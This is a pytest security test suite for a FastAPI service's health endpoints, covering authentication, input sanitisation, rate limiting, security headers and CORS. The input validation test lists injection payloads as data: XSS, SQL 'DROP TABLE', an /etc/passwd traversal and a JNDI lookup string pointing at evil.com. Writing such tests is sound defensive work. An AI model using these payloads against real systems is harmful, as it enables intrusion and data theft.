"""
Test Health Endpoint Security Comprehensive - Phase 5 Test Suite

Business Value Justification (BVJ):
- Segment: Platform/Internal, All customer tiers  
- Business Goal: System security and monitoring reliability
- Value Impact: Prevents security breaches and ensures reliable monitoring
- Strategic Impact: Foundation for production monitoring and security

CRITICAL REQUIREMENTS:
- Tests real API endpoint security with authentication
- Validates input sanitization and authorization
- Ensures monitoring data is protected
- No mocks - uses real FastAPI endpoints
"""
import pytest
import httpx
import asyncio
import json
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
import uuid
from test_framework.ssot.base_test_case import SSotBaseTestCase
from test_framework.ssot.e2e_auth_helper import E2EAuthHelper, E2EAuthConfig
from test_framework.ssot.isolated_test_helper import IsolatedTestHelper
from shared.isolated_environment import get_env
from netra_backend.app.api.health_checks import health_router
from netra_backend.app.auth_integration.auth import get_current_user

class HealthEndpointSecurityComprehensiveTests(SSotBaseTestCase):
    """
    Comprehensive health endpoint security tests.
    
    Tests critical API security that protects business monitoring:
    - Authentication and authorization enforcement
    - Input validation and sanitization  
    - Rate limiting and abuse prevention
    - Sensitive data protection
    - Security headers and CORS
    """

    def setup_auth_helper(self) -> E2EAuthHelper:
        """Set up authentication helper for API tests."""
        env = get_env()
        test_prefix = f'health_security_{uuid.uuid4().hex[:8]}'
        base_url = env.get('BACKEND_URL', 'http://localhost:8000')
        auth_config = E2EAuthConfig(auth_service_url=env.get('AUTH_SERVICE_URL', 'http://localhost:8081'), backend_url=base_url, test_user_email=f'{test_prefix}@security.test', timeout=10.0)
        return E2EAuthHelper(config=auth_config)

    @pytest.mark.integration
    @pytest.mark.real_services
    async def test_health_endpoint_authentication_enforcement(self):
        """
        Test authentication enforcement on health endpoints.
        
        BUSINESS CRITICAL: Unauthenticated access exposes system internals.
        Must require proper authentication for sensitive health data.
        """
        env = get_env()
        base_url = env.get('BACKEND_URL', 'http://localhost:8000')
        auth_helper = self.setup_auth_helper()
        protected_endpoints = ['/health/config', '/health/cache/clear', '/health/startup']
        public_endpoints = ['/health', '/health/database', '/health/redis', '/health/clickhouse']
        async with httpx.AsyncClient(timeout=30.0) as client:
            for endpoint in protected_endpoints:
                url = f'{base_url}{endpoint}'
                response = await client.get(url)
                assert response.status_code in [401, 403], f'Protected endpoint {endpoint} allows unauthenticated access: {response.status_code}'
                response_text = response.text.lower()
                sensitive_terms = ['password', 'secret', 'token', 'key', 'connection_string']
                for term in sensitive_terms:
                    assert term not in response_text, f"Sensitive information '{term}' leaked in auth error for {endpoint}"
            for endpoint in public_endpoints:
                url = f'{base_url}{endpoint}'
                response = await client.get(url)
                assert response.status_code in [200, 503], f'Public endpoint {endpoint} incorrectly requires auth: {response.status_code}'
                if response.status_code == 200:
                    try:
                        health_data = response.json()
                        assert isinstance(health_data, dict), f'Health endpoint {endpoint} should return JSON object'
                        health_json = json.dumps(health_data).lower()
                        sensitive_terms = ['password', 'secret', 'private_key', 'connection_string']
                        for term in sensitive_terms:
                            assert term not in health_json, f"Sensitive data '{term}' exposed in public endpoint {endpoint}"
                    except json.JSONDecodeError:
                        pytest.fail(f'Public endpoint {endpoint} returned invalid JSON')
            test_prefix = f'health_security_{uuid.uuid4().hex[:8]}'
            auth_token = auth_helper.create_test_jwt_token(user_id=f'health_test_{uuid.uuid4().hex[:8]}', email=f'{test_prefix}_auth@security.test', permissions=['health_read', 'health_admin'])
            auth_headers = auth_helper.get_auth_headers(auth_token)
            for endpoint in protected_endpoints:
                url = f'{base_url}{endpoint}'
                if endpoint == '/health/cache/clear':
                    response = await client.post(url, headers=auth_headers)
                else:
                    response = await client.get(url, headers=auth_headers)
                assert response.status_code in [200, 500], f'Authenticated request to {endpoint} failed: {response.status_code}'
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if endpoint == '/health/config':
                            assert 'environment' in data, 'Config endpoint should include environment'
                            assert 'services_configured' in data, 'Config should include service status'
                        elif endpoint == '/health/startup':
                            assert 'system_health' in data, 'Startup should include system health'
                            assert 'startup_ready' in data, 'Startup should include readiness status'
                    except json.JSONDecodeError:
                        if endpoint != '/health/cache/clear':
                            pytest.fail(f'Protected endpoint {endpoint} returned invalid JSON')

    @pytest.mark.integration
    @pytest.mark.real_services
    async def test_health_endpoint_input_validation_and_sanitization(self):
        """
        Test input validation and sanitization on health endpoints.
        
        BUSINESS CRITICAL: Improper input handling enables injection attacks.
        Must validate and sanitize all inputs to prevent security breaches.
        """
        env = get_env()
        base_url = env.get('BACKEND_URL', 'http://localhost:8000')
        auth_helper = self.setup_auth_helper()
        auth_token = auth_helper.create_test_jwt_token(user_id=f'validation_test_{uuid.uuid4().hex[:8]}', permissions=['health_read', 'health_admin'])
        auth_headers = auth_helper.get_auth_headers(auth_token)
        async with httpx.AsyncClient(timeout=30.0) as client:
            base_health_url = f'{base_url}/health'
            valid_params = [{'force': 'true'}, {'force': 'false'}, {'force': '1'}, {'force': '0'}]
            for params in valid_params:
                response = await client.get(base_health_url, params=params)
                assert response.status_code in [200, 503], f'Valid parameter {params} rejected: {response.status_code}'
            malicious_params = [{'force': "<script>alert('xss')</script>"}, {'force': "'; DROP TABLE users; --"}, {'force': '../../../etc/passwd'}, {'force': '${jndi:ldap://evil.com/a}'}, {'force': '{{7*7}}'}, {'force': '\\x00\\x01\\x02'}, {'invalid_param': 'value'}, {'force': 'x' * 10000}]
            for params in malicious_params:
                response = await client.get(base_health_url, params=params)
                assert response.status_code in [200, 400, 503], f'Malicious parameter {list(params.keys())[0]} caused server error: {response.status_code}'
                response_text = response.text.lower()
                malicious_indicators = ['<script>', 'alert(', 'drop table', 'etc/passwd', 'jndi:', '${', '{{', '\\x00']
                for indicator in malicious_indicators:
                    assert indicator not in response_text, f"Malicious content '{indicator}' reflected in response"
            endpoints_methods = [('/health', ['GET']), ('/health/database', ['GET']), ('/health/cache/clear', ['POST'])]
            invalid_methods = ['PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
            for endpoint, allowed_methods in endpoints_methods:
                url = f'{base_url}{endpoint}'
                for method in invalid_methods:
                    if method not in allowed_methods:
                        response = await client.request(method, url, headers=auth_headers)
                        assert response.status_code == 405, f'Endpoint {endpoint} incorrectly allows {method}: {response.status_code}'
            malicious_headers = {'X-Forwarded-For': "127.0.0.1, <script>alert('xss')</script>", 'User-Agent': "Mozilla/5.0 '; DROP TABLE sessions; --", 'Referer': 'http://evil.com/{{7*7}}', 'X-Real-IP': '../../../etc/passwd'}
            malicious_headers.update(auth_headers)
            response = await client.get(base_health_url, headers=malicious_headers)
            assert response.status_code in [200, 503], f'Malicious headers caused failure: {response.status_code}'
            response_text = response.text.lower()
            header_content = ['<script>', 'drop table', '{{', 'etc/passwd']
            for content in header_content:
                assert content not in response_text, f"Header injection content '{content}' reflected in response"

    @pytest.mark.integration
    @pytest.mark.real_services
    async def test_health_endpoint_rate_limiting_and_abuse_prevention(self):
        """
        Test rate limiting and abuse prevention on health endpoints.
        
        BUSINESS CRITICAL: Unlimited requests enable DoS attacks.
        Must implement rate limiting to protect system availability.
        """
        env = get_env()
        base_url = env.get('BACKEND_URL', 'http://localhost:8000')
        auth_helper = self.setup_auth_helper()
        auth_token = auth_helper.create_test_jwt_token(user_id=f'rate_limit_test_{uuid.uuid4().hex[:8]}', permissions=['health_read'])
        auth_headers = auth_helper.get_auth_headers(auth_token)
        async with httpx.AsyncClient(timeout=30.0) as client:
            health_url = f'{base_url}/health'
            normal_requests = []
            for i in range(5):
                response = await client.get(health_url, headers=auth_headers)
                normal_requests.append(response.status_code)
                await asyncio.sleep(1.0)
            successful_normal = sum((1 for status in normal_requests if status == 200))
            assert successful_normal >= 4, f'Normal rate requests failing: {successful_normal}/5 successful'
            burst_responses = []
            burst_start = datetime.now()
            for i in range(20):
                response = await client.get(health_url, headers=auth_headers)
                burst_responses.append({'status': response.status_code, 'time': datetime.now(), 'headers': dict(response.headers)})
                await asyncio.sleep(0.1)
            burst_duration = (datetime.now() - burst_start).total_seconds()
            success_count = sum((1 for r in burst_responses if r['status'] == 200))
            rate_limited_count = sum((1 for r in burst_responses if r['status'] == 429))
            assert success_count + rate_limited_count == 20, f'Unexpected status codes in burst test: success={success_count}, limited={rate_limited_count}'
            if rate_limited_count > 0:
                rate_limited_response = next((r for r in burst_responses if r['status'] == 429))
                headers = rate_limited_response['headers']
                rate_limit_headers = ['x-ratelimit-limit', 'x-ratelimit-remaining', 'x-ratelimit-reset', 'retry-after']
                has_rate_limit_header = any((header in headers for header in rate_limit_headers))
                assert has_rate_limit_header, 'Rate limited response missing rate limit headers'
            endpoints_to_test = ['/health/database', '/health/redis', '/health/clickhouse']
            for endpoint in endpoints_to_test:
                url = f'{base_url}{endpoint}'
                endpoint_responses = []
                for i in range(10):
                    response = await client.get(url, headers=auth_headers)
                    endpoint_responses.append(response.status_code)
                    await asyncio.sleep(0.2)
                success_rate = sum((1 for status in endpoint_responses if status in [200, 503])) / len(endpoint_responses)
                assert success_rate >= 0.5, f'Endpoint {endpoint} too restrictive: {success_rate:.1%} success rate'
            unauth_responses = []
            for i in range(10):
                response = await client.get(health_url)
                unauth_responses.append(response.status_code)
                await asyncio.sleep(0.2)
            unauth_success_rate = sum((1 for status in unauth_responses if status in [200, 503])) / len(unauth_responses)
            assert unauth_success_rate >= 0.3, f'Unauthenticated rate limiting too strict: {unauth_success_rate:.1%} success rate'

    @pytest.mark.integration
    @pytest.mark.real_services
    async def test_health_endpoint_security_headers_and_cors(self):
        """
        Test security headers and CORS configuration.
        
        BUSINESS CRITICAL: Missing security headers enable various attacks.
        Must implement proper security headers and CORS policies.
        """
        env = get_env()
        base_url = env.get('BACKEND_URL', 'http://localhost:8000')
        auth_helper = self.setup_auth_helper()
        async with httpx.AsyncClient(timeout=30.0) as client:
            health_url = f'{base_url}/health'
            response = await client.get(health_url)
            assert response.status_code in [200, 503], f'Health endpoint failed: {response.status_code}'
            headers = response.headers
            security_headers_checks = [{'header': 'X-Content-Type-Options', 'expected': 'nosniff', 'critical': True}, {'header': 'X-Frame-Options', 'expected_values': ['DENY', 'SAMEORIGIN'], 'critical': True}, {'header': 'X-XSS-Protection', 'expected': '1; mode=block', 'critical': False}, {'header': 'Content-Security-Policy', 'must_contain': ['default-src'], 'critical': True}, {'header': 'Strict-Transport-Security', 'must_contain': ['max-age'], 'critical': False}]
            missing_critical_headers = []
            for check in security_headers_checks:
                header_name = check['header']
                header_value = headers.get(header_name, '').lower()
                if 'expected' in check:
                    if header_value != check['expected'].lower():
                        if check['critical']:
                            missing_critical_headers.append(f"{header_name}: expected '{check['expected']}', got '{header_value}'")
                elif 'expected_values' in check:
                    if not any((expected.lower() in header_value for expected in check['expected_values'])):
                        if check['critical']:
                            missing_critical_headers.append(f"{header_name}: should contain one of {check['expected_values']}, got '{header_value}'")
                elif 'must_contain' in check:
                    if not any((keyword in header_value for keyword in check['must_contain'])):
                        if check['critical']:
                            missing_critical_headers.append(f"{header_name}: should contain {check['must_contain']}, got '{header_value}'")
            assert len(missing_critical_headers) == 0, f'Critical security headers missing: {missing_critical_headers}'
            cors_origins_to_test = ['https://app.netrasystems.ai', 'https://staging.netrasystems.ai', 'http://localhost:3000', 'https://evil.com']
            for origin in cors_origins_to_test:
                cors_headers = {'Origin': origin, 'Access-Control-Request-Method': 'GET', 'Access-Control-Request-Headers': 'authorization,content-type'}
                preflight_response = await client.options(health_url, headers=cors_headers)
                cors_response_headers = preflight_response.headers
                allowed_origin = cors_response_headers.get('Access-Control-Allow-Origin', '')
                if origin.endswith('netrasystems.ai') or origin.startswith('http://localhost'):
                    assert allowed_origin in [origin, '*'], f'Legitimate origin {origin} not allowed: {allowed_origin}'
                elif origin == 'https://evil.com':
                    assert allowed_origin != origin, f'Malicious origin {origin} incorrectly allowed'
                if 'Access-Control-Allow-Credentials' in cors_response_headers:
                    if cors_response_headers['Access-Control-Allow-Credentials'].lower() == 'true':
                        assert allowed_origin != '*', 'CORS allows credentials with wildcard origin - security risk'
            all_headers_text = ' '.join((f'{k}:{v}' for k, v in headers.items())).lower()
            sensitive_info = ['server: apache', 'server: nginx', 'server: iis', 'x-powered-by:', 'x-aspnet-version', 'x-aspnetmvc-version', 'set-cookie:']
            exposed_info = [info for info in sensitive_info if info in all_headers_text]
            assert len(exposed_info) == 0, f'Sensitive server information exposed in headers: {exposed_info}'
            if response.status_code == 200:
                try:
                    health_data = response.json()
                    health_text = json.dumps(health_data).lower()
                    sensitive_patterns = ['/home/', '/etc/', '/var/', '/usr/', 'password', 'secret', 'key', 'token', 'internal ip', 'private key', 'stack trace', 'exception']
                    leaked_info = [pattern for pattern in sensitive_patterns if pattern in health_text]
                    assert len(leaked_info) == 0, f'Sensitive information leaked in health response: {leaked_info}'
                except json.JSONDecodeError:
                    pass
if __name__ == '__main__':
    'MIGRATED: Use SSOT unified test runner'
    print('MIGRATION NOTICE: Please use SSOT unified test runner')
    print('Command: python tests/unified_test_runner.py --category <category>')